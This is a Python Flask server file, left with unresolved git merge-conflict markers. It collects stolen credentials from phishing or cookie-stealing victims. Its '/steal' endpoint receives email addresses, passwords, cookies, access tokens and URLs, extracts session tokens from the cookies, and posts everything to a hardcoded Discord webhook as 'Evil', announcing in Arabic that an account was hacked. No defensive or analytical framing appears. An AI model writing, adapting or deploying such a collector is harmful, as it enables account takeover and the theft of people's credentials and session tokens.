from flask import Flask, request
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

<<<<<<< HEAD
# ===== ويب هوك ديسكورد (تم التحديث بالرابط الجديد) =====
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532217110254850159/tIIeGy0xULqA0yPxSOt4YjC3MuV1Y8QOTtUwcly25hV8oG5O4VJLM1AEMu7OKRT9UpIl"
=======
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532217110254850159/tlleGy0xULqA0yPxS0t4YjC3MuV1Y8QOTtUwclY25hV8oG5O4VJLm1AEMu7OKRT9UpII"
>>>>>>> f0dda9c90c948e3856554457341e5b2cbc9eed28

def send_to_discord(message):
    data = {"content": message, "username": "Evil"}
    try:
<<<<<<< HEAD
        response = requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
        if response.status_code != 204:
            print(f"خطأ في الإرسال: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"استثناء في الإرسال: {e}")
=======
        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
    except:
        pass
>>>>>>> f0dda9c90c948e3856554457341e5b2cbc9eed28

@app.route('/steal', methods=['POST'])
def steal():
    data = request.get_json()
    if not data:
        return "No data", 400

    cookies = data.get('cookies', 'لا يوجد')
    email = data.get('email', 'غير موجود')
    password = data.get('password', 'غير موجود')
    token = data.get('token', 'غير موجود')
    user_agent = data.get('userAgent', 'غير معروف')
    time = data.get('time', datetime.now().isoformat())
<<<<<<< HEAD

    # محاولة استخراج التوكن من الكوكيز إذا لم يتم العثور عليه
=======
    url = data.get('url', 'غير معروف')

>>>>>>> f0dda9c90c948e3856554457341e5b2cbc9eed28
    if token == "غير موجود" and 'accessToken=' in cookies:
        match = re.search(r'accessToken=([^;]+)', cookies)
        if match:
            token = match.group(1)

    message = f"""
<<<<<<< HEAD
**🎯 تم الاختراق!**
=======
**🎯 تم اختراق حساب جديد!**
>>>>>>> f0dda9c90c948e3856554457341e5b2cbc9eed28
**📧 البريد:** `{email}`
**🔑 كلمة المرور:** `{password}`
**🔐 التوكن:** `{token}`
**🍪 الكوكيز:** `{cookies[:150]}...`
**🖥️ المتصفح:** {user_agent}
**⏰ الوقت:** {time}
<<<<<<< HEAD
=======
**🔗 الرابط:** {url}
>>>>>>> f0dda9c90c948e3856554457341e5b2cbc9eed28
    """
    send_to_discord(message)
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)